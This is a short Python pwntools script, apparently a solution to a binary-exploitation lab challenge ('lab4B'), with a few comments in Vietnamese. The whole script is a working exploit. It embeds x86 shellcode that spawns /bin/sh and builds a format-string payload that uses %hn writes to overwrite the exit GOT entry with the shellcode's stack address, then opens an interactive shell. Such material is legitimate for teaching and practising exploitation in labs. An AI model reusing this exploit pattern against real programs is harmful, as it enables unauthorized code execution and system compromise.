from pwn import *
import sys
def rune():
	shellcode = "\x31\xc0"\
            "\x83\xec\x04"\
            "\x89\x04\x24"\
            "\x68\x2f\x2f\x73\x68"\
            "\x68\x2f\x62\x69\x6e"\
            "\x89\xe3"\
            "\x89\xc1"\
            "\x89\xc2"\
            "\xb0\x0b"\
            "\xcd\x80"\
            # len = 28
	r = process("./lab4B")
	raw_input("debug")
	exit_got  = 0x080499b8
	addr_buf  = int(sys.argv[1], 16) # gdb: 0xbffff6a8
 
	value_u2 = addr_buf >> 16
	value_l2 = addr_buf & 0xffff
	expl  = shellcode
	expl += p32(exit_got+2) # upper bytes at higher address --> little endian!
	expl += p32(exit_got) #little dia chi thap luu byte thap..
	expl += "%" + str(value_u2 - 28 - 8) + "x"
	expl += "%13$hn"
	expl += "%" + str(value_l2 - value_u2) + "x"
	expl += "%14$hn"
	r.sendline(expl)
	r.interactive()

rune()
